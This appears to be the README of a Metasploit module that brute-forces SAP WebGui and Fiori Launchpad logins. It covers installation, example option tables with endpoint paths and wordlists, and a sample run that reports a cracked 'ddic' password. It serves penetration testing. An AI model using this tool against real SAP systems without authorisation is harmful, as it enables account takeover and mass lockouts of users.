# SAP WebGui & SAP Fiori Launchpad brute-force module for Metasploit

This module is written for the Metasploit Framework to brute-force SAP WebGui and SAP Fiori Launchpad.
It heavly base on the original module found in the root of the repository.

While using this module, please keep in mind, that SAP does not allow more than 99 failed logins until a user get locked out. (Parameter: `login/fails_to_user_lock`)

## Installation

Download the metasploit module and copy it into the custom modules path
```bash
mkdir -p ~/.msf4/modules/auxiliary/scanner/sap/
cp sap_web_bruteforce.py ~/.msf4/modules/auxiliary/scanner/sap/
```

## Usage

- Start Metasploit Framework
```bash
msfconsole -q
```
- switch to the module
```bash
use auxiliary/scanner/sap/sap_web_bruteforce
```

### Example configuration SAP Fiori Launchpad
```text
Module options (auxiliary/sap/sap_web_bruteforce):

   Name        Current Setting                          Required  Description
   ----        ---------------                          --------  -----------
   BRUTE_MODE  fiori                                    no        Which endpoint you want to attack (webgui/fiori)
   PASS_FILE   /opt/wordlists_custom/sap_passwords.txt  yes       Wordlist with passwords
   RHOSTS      192.168.77.4                             yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file
                                                                  :<path>'
   RPORT       50001                                    yes       Target port
   SAP_CLIENT  001                                      no        Target SAP client
   SAP_SID     A4H                                      yes       Target SAP SID
   SSL         True                                     yes       use SSL (true/false)
   TARGETURI   /sap/bc/ui2/flp                          yes       The base path
   THREADS     1                                        yes       The number of concurrent threads (max one per host)
   USER_FILE   /opt/wordlists_custom/sap_users.txt      yes       Wordlist with usernames
```

### Example configuration SAP WebGui
```text
Module options (auxiliary/sap/sap_web_bruteforce):

   Name        Current Setting                          Required  Description
   ----        ---------------                          --------  -----------
   BRUTE_MODE  webgui                                   no        Which endpoint you want to attack (webgui/fiori)
   PASS_FILE   /opt/wordlists_custom/sap_passwords.txt  yes       Wordlist with passwords
   RHOSTS      192.168.230.30                           yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file
                                                                  :<path>'
   RPORT       8000                                     yes       Target port
   SAP_CLIENT  001                                      no        Target SAP client
   SAP_SID     XYZ                                      yes       Target SAP SID
   SSL         false                                    yes       use SSL (true/false)
   TARGETURI   /sap/bc/gui/sap/its/webgui               yes       The base path
   THREADS     1                                        yes       The number of concurrent threads (max one per host)
   USER_FILE   /opt/wordlists_custom/sap_users.txt      yes       Wordlist with usernames
```

### Run the module

```bash
msf6 auxiliary(sap/sap_web_bruteforce) > run

[*] Running for 192.168.230.30...
[*] Valid credential ddic:Security123
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```